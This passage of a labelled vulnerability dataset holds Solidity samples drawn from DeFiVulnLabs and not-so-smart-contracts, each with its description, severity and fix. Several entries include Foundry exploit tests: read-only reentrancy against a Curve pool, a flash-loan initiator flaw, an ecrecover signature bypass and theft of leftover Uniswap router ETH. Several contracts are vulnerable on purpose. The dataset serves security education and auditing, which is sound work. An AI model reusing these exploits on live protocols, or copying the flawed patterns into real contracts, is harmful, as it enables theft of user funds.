    "file_name": "Oracle-stale.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Oracle data feed is insufficiently validated\n\nDescription:\nChainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.\n\nMitigation:\nlatestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674611468975878144\nhttps://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94\nhttps://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price\nhttps://docs.chain.link/data-feeds/historical-data#getrounddata-return-values\n*/\n\ncontract ContractTest is Test {\n    AggregatorV3Interface internal priceFeed;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n        ); // ETH/USD\n    }\n\n    function testUnSafePrice() public {\n        //Chainlink oracle data feed is not sufficiently validated and can return stale price.\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    function testSafePrice() public {\n        (\n            uint80 roundId,\n            int256 answer,\n            ,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        /*\n        Mitigation:\n        answeredInRound: The round ID in which the answer was computed\n        updatedAt: Timestamp of when the round was updated\n        answer: The answer for this round\n        */\n        require(answeredInRound >= roundId, \"answer is stale\");\n        require(updatedAt > 0, \"round is incomplete\");\n        require(answer > 0, \"Invalid feed answer\");\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    receive() external payable {}\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Oracle data feed is insufficiently validated",
    "description": "Chainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.",
    "scenario": "",
    "fix_description": "latestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Oracle-stale.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_flashloan-flaw",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Flashloan-flaw.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Missing flash loan initiator check\n\nDescription:\nMissing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.\n\nMitigation:  \nCheck the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "flash_loan_attack",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Missing flash loan initiator check",
    "description": "Missing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.",
    "scenario": "",
    "fix_description": "Check the initiator of the flash loan and revert if the initiator is not authorized.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Flashloan-flaw.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_readonlyreentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ReadOnlyReentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n/*\nName: Read-Only Reentrancy Vulnerability\n\nDescription:\nThe Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.\n\nMitigation:\nAvoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }\n\nREF\nhttps://twitter.com/1nf0s3cpt/status/1590622114834706432\nhttps://chainsecurity.com/heartbreaks-curve-lp-oracles/\nhttps://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334\nhttps://www.youtube.com/watch?v=0fgGTRlsDxI\n\n*/\n\ninterface ICurve {\n    function get_virtual_price() external view returns (uint);\n\n    function add_liquidity(\n        uint[2] calldata amounts,\n        uint min_mint_amount\n    ) external payable returns (uint);\n\n    function remove_liquidity(\n        uint lp,\n        uint[2] calldata min_amounts\n    ) external returns (uint[2] memory);\n\n    function remove_liquidity_one_coin(\n        uint lp,\n        int128 i,\n        uint min_amount\n    ) external returns (uint);\n}\n\naddress constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;\naddress constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token\n\n// VulnContract\n// users stake LP_TOKEN\n// getReward rewards the users based on the current price of the pool LP token\ncontract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\ncontract ExploitContract {\n    ICurve private constant pool = ICurve(STETH_POOL);\n    IERC20 public constant lpToken = IERC20(LP_TOKEN);\n    VulnContract private immutable target;\n\n    constructor(address _target) {\n        target = VulnContract(_target);\n    }\n\n    // Stake LP into VulnContract\n    function stakeTokens() external payable {\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        console.log(\n            \"LP token price after staking into VulnContract\",\n            pool.get_virtual_price()\n        );\n\n        lpToken.approve(address(target), lp);\n        target.stake(lp);\n    }\n\n    // Perform Read-Only Reentrancy\n    function performReadOnlyReentrnacy() external payable {\n        // Add liquidity to Curve\n        uint[2] memory amounts = [msg.value, 0];\n        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);\n        // Log get_virtual_price\n        console.log(\n            \"LP token price before remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Remove liquidity from Curve\n        // remove_liquidity() invokes the recieve() callback\n        uint[2] memory min_amounts = [uint(0), uint(0)];\n        pool.remove_liquidity(lp, min_amounts);\n        // Log get_virtual_price\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price after remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is not invoked: \", reward);\n    }\n\n    receive() external payable {\n        // receive() is called when the remove_liquidity is called\n        console.log(\n            \"--------------------------------------------------------------------\"\n        );\n        console.log(\n            \"LP token price during remove_liquidity()\",\n            pool.get_virtual_price()\n        );\n        // Attack - Log reward amount\n        uint reward = target.getReward();\n        console.log(\"Reward if Read-Only Reentrancy is invoked: \", reward);\n    }\n}\n\ncontract ExploitTest is Test {\n    ExploitContract public hack;\n    VulnContract public target;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\");\n        target = new VulnContract(); // deploy the vulnerable contract\n        hack = new ExploitContract(address(target)); // deploy attacker contract\n    }\n\n    function testPwn() public {\n        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract\n        hack.performReadOnlyReentrnacy{value: 100000 ether}();\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnContract {\n    IERC20 public constant token = IERC20(LP_TOKEN);\n    ICurve private constant pool = ICurve(STETH_POOL);\n\n    mapping(address => uint) public balanceOf;\n\n    function stake(uint amount) external {\n        token.transferFrom(msg.sender, address(this), amount);\n        balanceOf[msg.sender] += amount;\n    }\n\n    function unstake(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n    }\n\n    function getReward() external view returns (uint) {\n        //rewarding tokens based on the current virtual price of the pool LP token\n        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /\n            1 ether;\n        // Omitting code to transfer reward tokens\n        return reward;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Read-Only Reentrancy Vulnerability",
    "description": "The Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers \nto exploit the \"read-only\" nature of a function to make unintended changes to the contract's state. \nSpecifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract \nto trigger the receive function in the ExploitContract. This is achieved by an external call \nfrom a secure smart contract \"A\" invoking the fallback() function in the attacker's contract.\n\nThrough this exploit, the attacker gains the ability to execute code within the fallback() function\nagainst a target contract \"B,\" which is indirectly related to contract \"A.\" Contract \"B\" derives\nthe price of the LP token from Contract \"A,\" making it susceptible to manipulation and unintended price changes\nthrough the reentrancy attack.",
    "scenario": "",
    "fix_description": "Avoid any state-changing operations within functions that are intended to be read-only.\nMakerdao example:\n        // This will revert if called during execution of a state-modifying pool function.\n        if (nonreentrant) {\n            uint256[2] calldata amounts;\n            CurvePoolLike(pool).remove_liquidity(0, amounts);\n        }",
    "references": [
      "https://twitter.com/1nf0s3cpt/status/1590622114834706432"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ReadOnlyReentrancy.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_uniswapv3ethrefundexploit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "UniswapV3ETHRefundExploit.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// this excersise is specific UniSwapV3 ETH refund issue\n// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc\n// @article:\n// https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/\n\nstruct ExactInputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountIn;\n    uint256 amountOutMinimum;\n    uint160 sqrtPriceLimitX96;\n}\n\ninterface ISwapRouter {\n    function exactInputSingle(\n        ExactInputSingleParams calldata params\n    ) external payable returns (uint256 amountOut);\n\n    function refundETH() external payable;\n}\n\ninterface IPool {\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IWETH9 {\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ncontract UniswapV3ETHRefundExploitTest is Test {\n    ISwapRouter router =\n        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);\n\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    function testExploit() public {\n        vm.createSelectFork(\"mainnet\", 16454867);\n\n        uint256 amountIn = 100 ether;\n\n        vm.label(address(this), \"user\");\n        vm.deal(address(this), amountIn);\n\n        // Users sells 100 ETH to buy USDC. They have a limit price set.\n        ExactInputSingleParams memory params = ExactInputSingleParams({\n            tokenIn: weth,\n            tokenOut: usdc,\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2\n        });\n\n        // Full input amount is sent along the call.\n        router.exactInputSingle{value: amountIn}(params);\n\n        // User has bought some USDC. However, the full input ETH amount wasn't used...\n        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);\n\n        // ... the remaining ETH is still in the Router contract.\n        uint256 routerBeforeBalance = address(router).balance;\n        assertEq(routerBeforeBalance, 50 ether);\n\n        // A MEV bot steals the remaining ETH by calling the public refundETH function.\n        address mev = address(0x31337);\n        vm.label(mev, \"mev\");\n\n        vm.prank(mev);\n        router.refundETH();\n        assertEq(address(mev).balance, 50 ether);\n        uint256 routerAfterBalance = address(router).balance;\n        assertEq(routerAfterBalance, 0 ether);\n        console.log(\n            \"router loss ether amount:\",\n            routerBeforeBalance - routerAfterBalance\n        );\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/UniswapV3ETHRefundExploit.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_ecrecover",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ecrecover.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: ecrecover returns address(0)\n\nDescription:\nIn the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).\n\nMitigation:  \nVerify that the result from ecrecover isn't 0 or instead use OpenZeppelin\u2019s ECDSA library.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674268926761668608\nhttps://github.com/code-423n4/2021-09-swivel-findings/issues/61\nhttps://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testecRecover() public {\n        emit log_named_decimal_uint(\n            \"Before exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n        bytes32 _hash = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\")\n        );\n        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);\n\n        // If v value isn't 27 or 28. it will return address(0)\n        uint8 v = 29;\n        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);\n\n        emit log_named_decimal_uint(\n            \"After exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "ecrecover returns address(0)",
    "description": "In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.\nIt recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact \nthat the ecrecover function may return a 0x0 address when the signature parameters \nare invali, If v value isn't 27 or 28. it will return address(0).",
    "scenario": "",
    "fix_description": "Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin\u2019s ECDSA library.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/ecrecover.sol",
    "framework": "foundry"
  },
  {
    "id": "notso_bad_randomness_therun",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "theRun.sol",
    "file_content": "contract theRun {\n        uint private Balance = 0;\n        uint private Payout_id = 0;\n        uint private Last_Payout = 0;\n        uint private WinningPot = 0;\n        uint private Min_multiplier = 1100; //110%\n        \n\n        //Fees are necessary and set very low, to maintain the website. The fees will decrease each time they are collected.\n        //Fees are just here to maintain the website at beginning, and will progressively go to 0% :)\n        uint private fees = 0;\n        uint private feeFrac = 20; //Fraction for fees in per\"thousand\", not percent, so 20 is 2%\n        \n        uint private PotFrac = 30; //For the WinningPot ,30=> 3% are collected. This is fixed.\n        \n        \n        address private admin;\n        \n        function theRun() {\n            admin = msg.sender;\n        }\n\n        modifier onlyowner {if (msg.sender == admin) _;  }\n\n        struct Player {\n            address addr;\n            uint payout;\n            bool paid;\n        }\n\n        Player[] private players;\n\n        //--Fallback function\n        function() {\n            init();\n        }\n\n        //--initiated function\n        function init() private {\n            uint deposit=msg.value;\n            if (msg.value < 500 finney) { //only participation with >1 ether accepted\n                    msg.sender.send(msg.value);\n                    return;\n            }\n            if (msg.value > 20 ether) { //only participation with <20 ether accepted\n                    msg.sender.send(msg.value- (20 ether));\n                    deposit=20 ether;\n            }\n            Participate(deposit);\n        }\n\n        //------- Core of the game----------\n        function Participate(uint deposit) private {\n                //calculate the multiplier to apply to the future payout\n                \n\n                uint total_multiplier=Min_multiplier; //initiate total_multiplier\n                if(Balance < 1 ether && players.length>1){\n                    total_multiplier+=100; // + 10 %\n                }\n                if( (players.length % 10)==0 && players.length>1 ){ //Every 10th participant gets a 10% bonus, play smart !\n                    total_multiplier+=100; // + 10 %\n                }\n                \n                //add new player in the queue !\n                players.push(Player(msg.sender, (deposit * total_multiplier) / 1000, false));\n                \n                //--- UPDATING CONTRACT STATS ----\n                WinningPot += (deposit * PotFrac) / 1000; // take some 3% to add for the winning pot !\n                fees += (deposit * feeFrac) / 1000; // collect maintenance fees 2%\n                Balance += (deposit * (1000 - ( feeFrac + PotFrac ))) / 1000; // update balance\n\n                // Winning the Pot :) Condition : paying at least 1 people with deposit > 2 ether and having luck !\n                if(  ( deposit > 1 ether ) && (deposit > players[Payout_id].payout) ){ \n                    uint roll = random(100); //take a random number between 1 & 100\n                    if( roll % 10 == 0 ){ //if lucky : Chances : 1 out of 10 ! \n                        msg.sender.send(WinningPot); // Bravo !\n                        WinningPot=0;\n                    }\n                    \n                }\n                \n                //Classic payout for the participants\n                while ( Balance > players[Payout_id].payout ) {\n                    Last_Payout = players[Payout_id].payout;\n                    players[Payout_id].addr.send(Last_Payout); //pay the man, please !\n                    Balance -= players[Payout_id].payout; //update the balance\n                    players[Payout_id].paid=true;\n                    \n                    Payout_id += 1;\n                }\n        }\n\n\n\n    uint256 constant private salt =  block.timestamp;\n    \n    function random(uint Max) constant private returns (uint256 result){\n        //get the best seed for randomness\n        uint256 x = salt * 100 / Max;\n        uint256 y = salt * block.number / (salt % 5) ;\n        uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; \n        uint256 h = uint256(block.blockhash(seed)); \n    \n        return uint256((h / x)) % Max + 1; //random number between 1 and Max\n    }\n    \n    \n\n    //---Contract management functions\n    function ChangeOwnership(address _owner) onlyowner {\n        admin = _owner;\n    }\n    function WatchBalance() constant returns(uint TotalBalance) {\n        TotalBalance = Balance /  1 wei;\n    }\n    \n    function WatchBalanceInEther() constant returns(uint TotalBalanceInEther) {\n        TotalBalanceInEther = Balance /  1 ether;\n    }\n    \n    \n    //Fee functions for creator\n    function CollectAllFees() onlyowner {\n        if (fees == 0) throw;\n        admin.send(fees);\n        feeFrac-=1;\n        fees = 0;\n    }\n    \n    function GetAndReduceFeesByFraction(uint p) onlyowner {\n        if (fees == 0) feeFrac-=1; //Reduce fees.\n        admin.send(fees / 1000 * p);//send a percent of fees\n        fees -= fees / 1000 * p;\n    }\n        \n\n//---Contract informations\nfunction NextPayout() constant returns(uint NextPayout) {\n    NextPayout = players[Payout_id].payout /  1 wei;\n}\n\nfunction WatchFees() constant returns(uint CollectedFees) {\n    CollectedFees = fees / 1 wei;\n}\n\n\nfunction WatchWinningPot() constant returns(uint WinningPot) {\n    WinningPot = WinningPot / 1 wei;\n}\n\nfunction WatchLastPayout() constant returns(uint payout) {\n    payout = Last_Payout;\n}\n\nfunction Total_of_Players() constant returns(uint NumberOfPlayers) {\n    NumberOfPlayers = players.length;\n}\n\nfunction PlayerInfo(uint id) constant returns(address Address, uint Payout, bool UserPaid) {\n    if (id <= players.length) {\n        Address = players[id].addr;\n        Payout = players[id].payout / 1 wei;\n        UserPaid=players[id].paid;\n    }\n}\n\nfunction PayoutQueueSize() constant returns(uint QueueSize) {\n    QueueSize = players.length - Payout_id;\n}\n\n\n}\n",
    "vulnerable_function": "theRun",
    "vulnerable_lines": [],
    "vulnerability_type": "weak_randomness",
    "category": "bad_randomness",
    "severity": "low",
    "difficulty_tier": 1,
    "description": "# Bad Randomness",
    "fix_description": "",
    "references": [
      "https://eprint.iacr.org/2018/601.pdf",
      "https://github.com/randao/randao"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "bad_randomness/theRun_source_code/theRun.sol",
    "pragma": "unknown",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_reentrancy",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Reentrancy.sol",
